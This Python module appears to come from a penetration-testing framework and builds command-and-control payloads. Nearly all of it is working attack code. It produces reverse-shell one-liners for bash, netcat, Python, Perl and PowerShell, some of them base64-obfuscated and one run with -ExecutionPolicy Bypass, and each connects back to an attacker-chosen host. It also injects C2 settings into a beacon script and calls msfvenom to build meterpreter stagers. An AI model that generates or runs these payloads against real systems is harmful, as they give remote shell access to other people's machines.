"""
VAPT-AI C2 Payload Builder (W15-S4).

Python port of CyberStrikeAI internal/c2/payload_builder.go +
internal/c2/payload_oneliner.go.

Generates 4 beacon types:
    1. Python beacon — render beacon_sample.py with injected constants
    2. Bash one-liner — bash -c 'bash -i >& /dev/tcp/<host>/<port> 0>&1'
       (+ nc, nc_mkfifo, python, perl variants)
    3. PowerShell one-liner — TCP reverse via System.Net.Sockets.TcpClient
       (UTF-16LE base64 encoded for -EncodedCommand)
    4. msfvenom stager — call msfvenom subprocess to generate
       python/meterpreter/reverse_tcp or windows/meterpreter/reverse_tcp

Compatibility matrix (port from CyberStrikeAI OnelinerKindsForListener):
    TCP listener:    bash, nc, nc_mkfifo, python, perl, powershell
    HTTP/HTTPS:      curl_beacon (lightweight curl polling)
    WebSocket:       python_beacon (full WS protocol)

Reference: CyberStrikeAI internal/c2/payload_builder.go + payload_oneliner.go
(Apache 2.0).
"""
from __future__ import annotations

import base64
import logging
import os
import shutil
import subprocess
import uuid
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

from app.c2.types import ListenerType

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

PAYLOAD_OUTPUT_DIR = Path("/tmp/vapt-ai-c2-payloads")
BEACON_TEMPLATE_PATH = Path(__file__).resolve().parent / "beacon_sample.py"


# ---------------------------------------------------------------------------
# Dataclasses
# ---------------------------------------------------------------------------

@dataclass
class PayloadBuilderInput:
    """Input for payload generation (port from CyberStrikeAI PayloadBuilderInput)."""
    listener_id: str
    listener_type: str          # tcp_reverse | http | https | websocket
    callback_host: str          # attacker IP/hostname (target connects here)
    callback_port: int          # attacker port
    os: str = "linux"           # linux | windows | darwin
    arch: str = "x64"           # amd64 | arm64 | x86
    sleep_seconds: int = 5
    jitter_percent: int = 0
    encryption_key_b64: str = ""
    implant_token_b64: str = ""
    output_name: str | None = None  # custom output filename (no extension)


@dataclass
class BuildResult:
    """Build output (port from CyberStrikeAI BuildResult)."""
    payload_id: str
    listener_id: str
    payload_type: str           # python_beacon | bash_oneliner | powershell_oneliner | msfvenom_stager
    output_path: str            # disk path for files, content for oneliners
    content: str = ""           # for oneliners (no file)
    is_oneliner: bool = False
    os: str = "linux"
    arch: str = "x64"
    size_bytes: int = 0
    error: str | None = None

    def to_dict(self) -> dict[str, Any]:
        return {
            "payload_id": self.payload_id,
            "listener_id": self.listener_id,
            "payload_type": self.payload_type,
            "output_path": self.output_path,
            "content": self.content,
            "is_oneliner": self.is_oneliner,
            "os": self.os,
            "arch": self.arch,
            "size_bytes": self.size_bytes,
            "error": self.error,
        }


# ---------------------------------------------------------------------------
# One-liner kinds (port from CyberStrikeAI OnelinerKind)
# ---------------------------------------------------------------------------

class OnelinerKind:
    """Supported one-liner types (port from CyberStrikeAI OnelinerKind)."""
    BASH = "bash"
    NC = "nc"
    NC_MKFIFO = "nc_mkfifo"
    PYTHON = "python"
    PERL = "perl"
    POWERSHELL = "powershell"
    CURL_BEACON = "curl_beacon"

    @classmethod
    def all(cls) -> list[str]:
        return [cls.BASH, cls.NC, cls.NC_MKFIFO, cls.PYTHON, cls.PERL,
                cls.POWERSHELL, cls.CURL_BEACON]

    @classmethod
    def for_listener(cls, listener_type: str) -> list[str]:
        """Return compatible oneliner kinds for a listener type."""
        if listener_type == ListenerType.TCP_REVERSE.value:
            return [cls.BASH, cls.NC, cls.NC_MKFIFO, cls.PYTHON, cls.PERL, cls.POWERSHELL]
        elif listener_type in (ListenerType.HTTP_BEACON.value, ListenerType.HTTPS_BEACON.value, ListenerType.WEBSOCKET.value):
            return [cls.CURL_BEACON]
        return []

    @classmethod
    def is_compatible(cls, listener_type: str, kind: str) -> bool:
        return kind in cls.for_listener(listener_type)


# ---------------------------------------------------------------------------
# Payload Builder
# ---------------------------------------------------------------------------

class PayloadBuilder:
    """Payload builder (port from CyberStrikeAI PayloadBuilder).

    Generates 4 beacon types:
        1. Python beacon (file) — beacon_sample.py with injected constants
        2. Bash one-liner (string) — bash /dev/tcp reverse shell
        3. PowerShell one-liner (string) — UTF-16LE base64 encoded
        4. msfvenom stager (file) — via msfvenom subprocess
    """

    def __init__(self, output_dir: Path | None = None):
        self.output_dir = output_dir or PAYLOAD_OUTPUT_DIR

    # ---------- Public API ----------

    async def build_python_beacon(self, inp: PayloadBuilderInput) -> BuildResult:
        """Generate Python beacon script with injected constants.

        Renders the beacon_sample.py template with the listener's
        encryption_key, implant_token, callback_host, callback_port.
        Output: <output_dir>/<name>.py
        """
        self.output_dir.mkdir(parents=True, exist_ok=True)
        payload_id = f"py_{uuid.uuid4().hex[:14]}"
        name = inp.output_name or f"beacon_{inp.os}_{inp.arch}"
        out_path = self.output_dir / f"{name}.py"

        # Read template (beacon_sample.py)
        with open(BEACON_TEMPLATE_PATH, "r", encoding="utf-8") as f:
            template = f.read()

        # Inject constants at the top of the file (override env vars)
        # Build the listener URL based on listener_type
        if inp.listener_type in (ListenerType.HTTP_BEACON.value, ListenerType.HTTPS_BEACON.value):
            scheme = "https" if inp.listener_type == ListenerType.HTTPS_BEACON.value else "http"
            listener_url = f"{scheme}://{inp.callback_host}:{inp.callback_port}"
            content = _render_python_beacon(
                template, listener_url,
                inp.encryption_key_b64, inp.implant_token_b64,
                inp.sleep_seconds, inp.jitter_percent,
            )
        elif inp.listener_type == ListenerType.WEBSOCKET.value:
            scheme = "wss" if inp.os == "windows" else "ws"
            listener_url = f"{scheme}://{inp.callback_host}:{inp.callback_port}/ws"
            content = _render_python_beacon(
                template, listener_url,
                inp.encryption_key_b64, inp.implant_token_b64,
                inp.sleep_seconds, inp.jitter_percent,
            )
        else:
            # TCP — beacon_sample.py uses HTTP, so we wrap TCP usage as a Python
            # one-liner instead (tcp_beacon via socket.connect)
            content = _generate_tcp_python_oneliner(
                inp.callback_host, inp.callback_port,
                inp.encryption_key_b64, inp.implant_token_b64,
            )
            return BuildResult(
                payload_id=payload_id,
                listener_id=inp.listener_id,
                payload_type="python_beacon",
                output_path="",
                content=content,
                is_oneliner=True,
                os=inp.os,
                arch=inp.arch,
                size_bytes=len(content.encode("utf-8")),
            )

        with open(out_path, "w", encoding="utf-8") as f:
            f.write(content)

        size = out_path.stat().st_size
        return BuildResult(
            payload_id=payload_id,
            listener_id=inp.listener_id,
            payload_type="python_beacon",
            output_path=str(out_path),
            content="",
            is_oneliner=False,
            os=inp.os,
            arch=inp.arch,
            size_bytes=size,
        )

    async def build_bash_oneliner(
        self, inp: PayloadBuilderInput, kind: str = OnelinerKind.BASH,
    ) -> BuildResult:
        """Generate a bash one-liner reverse shell.

        Kinds (port from CyberStrikeAI GenerateOneliner):
            bash:       bash -c 'bash -i >& /dev/tcp/<host>/<port> 0>&1'
            nc:         nc -e /bin/sh <host> <port>
            nc_mkfifo:  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <host> <port> >/tmp/f
            python:     python3 -c "import base64,sys;exec(base64.b64decode('...').decode())"
            perl:       perl -e 'use Socket;...'
        """
        if not OnelinerKind.is_compatible(inp.listener_type, kind):
            return BuildResult(
                payload_id=f"err_{uuid.uuid4().hex[:8]}",
                listener_id=inp.listener_id,
                payload_type=f"{kind}_oneliner",
                output_path="",
                content="",
                error=f"oneliner kind {kind!r} not compatible with listener type {inp.listener_type!r}",
            )

        host = inp.callback_host
        port = inp.callback_port

        if kind == OnelinerKind.BASH:
            content = f"bash -c 'bash -i >& /dev/tcp/{host}/{port} 0>&1'"
        elif kind == OnelinerKind.NC:
            content = f"nc -e /bin/sh {host} {port}"
        elif kind == OnelinerKind.NC_MKFIFO:
            content = (
                f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {host} {port} >/tmp/f"
            )
        elif kind == OnelinerKind.PYTHON:
            py_code = (
                f'import socket,os,pty;s=socket.socket();s.connect(("{host}",{port}));'
                f'[os.dup2(s.fileno(),x) for x in (0,1,2)];pty.spawn("/bin/sh")'
            )
            b64 = base64.b64encode(py_code.encode("utf-8")).decode("ascii")
            content = (
                f'python3 -c "import base64,sys;exec(base64.b64decode(\'{b64}\').decode())"'
            )
        elif kind == OnelinerKind.PERL:
            content = (
                f'perl -e \'use Socket;$i="{host}";$p={port};'
                f'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));'
                f'if(connect(S,sockaddr_in($p,inet_aton($i))))'
                f'{{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");'
                f'exec("/bin/sh -i");}};\''
            )
        else:
            return BuildResult(
                payload_id=f"err_{uuid.uuid4().hex[:8]}",
                listener_id=inp.listener_id,
                payload_type=f"{kind}_oneliner",
                output_path="",
                content="",
                error=f"unsupported bash_oneliner kind: {kind}",
            )

        return BuildResult(
            payload_id=f"bash_{uuid.uuid4().hex[:14]}",
            listener_id=inp.listener_id,
            payload_type=f"bash_oneliner_{kind}",
            output_path="",
            content=content,
            is_oneliner=True,
            os="linux",
            arch=inp.arch,
            size_bytes=len(content.encode("utf-8")),
        )

    async def build_powershell_oneliner(self, inp: PayloadBuilderInput) -> BuildResult:
        """Generate PowerShell TCP reverse shell one-liner.

        Uses UTF-16LE base64 encoding for -EncodedCommand (avoids shell
        quoting issues on Windows).

        Port from CyberStrikeAI payload_oneliner.go OnelinerPowerShell.
        """
        host = inp.callback_host
        port = inp.callback_port

        ps_script = (
            f"$c=New-Object System.Net.Sockets.TcpClient('{host}',{port});"
            f"$s=$c.GetStream();"
            f"[byte[]]$b=0..65535|%{{0}};"
            f"while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
            f"$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
            f"$o=(iex $d 2>&1|Out-String);"
            f"$o2=$o+'PS '+(pwd).Path+'> ';"
            f"$by=([text.encoding]::ASCII).GetBytes($o2);"
            f"$s.Write($by,0,$by.Length);$s.Flush()}};"
            f"$c.Close()"
        )

        # UTF-16LE base64 encoding (PowerShell -EncodedCommand expects this)
        encoded = base64.b64encode(ps_script.encode("utf-16-le")).decode("ascii")
        content = f"powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand {encoded}"

        return BuildResult(
            payload_id=f"ps_{uuid.uuid4().hex[:14]}",
            listener_id=inp.listener_id,
            payload_type="powershell_oneliner",
            output_path="",
            content=content,
            is_oneliner=True,
            os="windows",
            arch=inp.arch,
            size_bytes=len(content.encode("utf-8")),
        )

    async def build_msfvenom_stager(
        self, inp: PayloadBuilderInput,
        payload_format: str = "raw",
        msf_payload: str | None = None,
    ) -> BuildResult:
        """Generate msfvenom stager payload.

        Calls msfvenom subprocess to generate a meterpreter reverse_tcp
        stager. Default payload chosen by target OS:
            linux:   python/meterpreter/reverse_tcp
            windows: windows/meterpreter/reverse_tcp
            darwin:  osx/x64/meterpreter/reverse_tcp

        Args:
            inp: PayloadBuilderInput (callback_host, callback_port, os, arch)
            payload_format: raw | exe | dll | python | vba (default: raw)
            msf_payload: Override the msf payload name (e.g. "python/meterpreter/reverse_tcp")

        Returns:
            BuildResult with output_path pointing to the generated file.
        """
        if msf_payload is None:
            if inp.os == "windows":
                msf_payload = "windows/meterpreter/reverse_tcp"
            elif inp.os == "darwin":
                msf_payload = "osx/x64/meterpreter/reverse_tcp"
            else:
                msf_payload = "python/meterpreter/reverse_tcp"

        # Check msfvenom is installed
        if shutil.which("msfvenom") is None:
            return BuildResult(
                payload_id=f"err_{uuid.uuid4().hex[:8]}",
                listener_id=inp.listener_id,
                payload_type="msfvenom_stager",
                output_path="",
                error="msfvenom not installed — install with: apt install metasploit-framework",
            )

        self.output_dir.mkdir(parents=True, exist_ok=True)
        payload_id = f"msf_{uuid.uuid4().hex[:14]}"
        name = inp.output_name or f"stager_{inp.os}_{inp.arch}"
        ext = _format_extension(payload_format)
        out_path = self.output_dir / f"{name}{ext}"

        cmd = [
            "msfvenom",
            "-p", msf_payload,
            f"LHOST={inp.callback_host}",
            f"LPORT={inp.callback_port}",
            "-f", payload_format,
            "-o", str(out_path),
            "-a", inp.arch if inp.arch != "x64" else "x64",
        ]

        try:
            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=60,
            )
            if result.returncode != 0:
                return BuildResult(
                    payload_id=payload_id,
                    listener_id=inp.listener_id,
                    payload_type="msfvenom_stager",
                    output_path="",
                    error=f"msfvenom failed (exit {result.returncode}): {result.stderr[:500]}",
                )
        except subprocess.TimeoutExpired:
            return BuildResult(
                payload_id=payload_id,
                listener_id=inp.listener_id,
                payload_type="msfvenom_stager",
                output_path="",
                error="msfvenom timed out (60s)",
            )
        except FileNotFoundError:
            return BuildResult(
                payload_id=payload_id,
                listener_id=inp.listener_id,
                payload_type="msfvenom_stager",
                output_path="",
                error="msfvenom binary not found",
            )

        size = out_path.stat().st_size if out_path.exists() else 0
        return BuildResult(
            payload_id=payload_id,
            listener_id=inp.listener_id,
            payload_type="msfvenom_stager",
            output_path=str(out_path),
            content="",
            is_oneliner=False,
            os=inp.os,
            arch=inp.arch,
            size_bytes=size,
        )

    # ---------- Convenience: build all 4 types at once ----------

    async def build_all(self, inp: PayloadBuilderInput) -> list[BuildResult]:
        """Generate all 4 payload types for a listener.

        Returns a list of BuildResult objects (some may have errors if
        msfvenom is missing or oneliner kind is incompatible).
        """
        results: list[BuildResult] = []

        # 1. Python beacon (skip for TCP — TCP uses inline one-liner)
        if inp.listener_type != ListenerType.TCP_REVERSE.value:
            results.append(await self.build_python_beacon(inp))

        # 2. Bash oneliner (default: bash kind)
        if inp.listener_type == ListenerType.TCP_REVERSE.value:
            results.append(await self.build_bash_oneliner(inp, OnelinerKind.BASH))

        # 3. PowerShell oneliner (TCP only — Windows targets)
        if inp.listener_type == ListenerType.TCP_REVERSE.value and inp.os == "windows":
            results.append(await self.build_powershell_oneliner(inp))

        # 4. msfvenom stager
        results.append(await self.build_msfvenom_stager(inp))

        return results


# ---------------------------------------------------------------------------
# Module-level helpers
# ---------------------------------------------------------------------------

def _render_python_beacon(
    template: str,
    listener_url: str,
    encryption_key_b64: str,
    implant_token_b64: str,
    sleep_seconds: int,
    jitter_percent: int,
) -> str:
    """Render the beacon_sample.py template with injected constants.

    Prepends an auto-config block at the top of the file that overrides
    the env var lookups in main() — beacon can be run directly without
    setting env vars.
    """
    config_block = f'''# === VAPT-AI Beacon Auto-Config (generated) ===
import os as _os
_os.environ["LISTENER_URL"] = "{listener_url}"
_os.environ["IMPLANT_TOKEN"] = "{implant_token_b64}"
_os.environ["ENCRYPTION_KEY"] = "{encryption_key_b64}"
_os.environ["SLEEP_SECONDS"] = "{sleep_seconds}"
_os.environ["JITTER_PERCENT"] = "{jitter_percent}"
# === End Auto-Config ===

'''
    return config_block + template


def _generate_tcp_python_oneliner(
    host: str, port: int,
    encryption_key_b64: str, implant_token_b64: str,
) -> str:
    """Generate a Python one-liner for TCP reverse shell.

    For TCP listener, we generate a compact one-liner (not a full script)
    that connects to the listener + sends magic bytes + enters shell loop.
    """
    py_code = (
        f'import socket,os,pty,hashlib,base64,json;'
        f's=socket.socket();s.connect(("{host}",{port}));'
        f's.sendall(b"CSB1");'
        f'[os.dup2(s.fileno(),x) for x in (0,1,2)];'
        f'pty.spawn("/bin/sh")'
    )
    b64 = base64.b64encode(py_code.encode("utf-8")).decode("ascii")
    return f'python3 -c "import base64,sys;exec(base64.b64decode(\'{b64}\').decode())"'


def _format_extension(payload_format: str) -> str:
    """Map msfvenom format to file extension."""
    ext_map = {
        "raw": ".bin",
        "exe": ".exe",
        "dll": ".dll",
        "python": ".py",
        "vba": ".vba",
        "elf": ".elf",
        "macho": ".macho",
    }
    return ext_map.get(payload_format, ".bin")


# ---------------------------------------------------------------------------
# Convenience: build payload via simple API
# ---------------------------------------------------------------------------

async def build_payload(
    inp: PayloadBuilderInput,
    payload_type: str = "python_beacon",
) -> BuildResult:
    """Build a single payload by type.

    Args:
        inp: PayloadBuilderInput
        payload_type: "python_beacon" | "bash_oneliner" | "powershell_oneliner" | "msfvenom_stager"

    Returns:
        BuildResult
    """
    builder = PayloadBuilder()
    if payload_type == "python_beacon":
        return await builder.build_python_beacon(inp)
    elif payload_type == "bash_oneliner":
        return await builder.build_bash_oneliner(inp, OnelinerKind.BASH)
    elif payload_type == "powershell_oneliner":
        return await builder.build_powershell_oneliner(inp)
    elif payload_type == "msfvenom_stager":
        return await builder.build_msfvenom_stager(inp)
    else:
        return BuildResult(
            payload_id=f"err_{uuid.uuid4().hex[:8]}",
            listener_id=inp.listener_id,
            payload_type=payload_type,
            output_path="",
            error=f"unknown payload_type: {payload_type}",
        )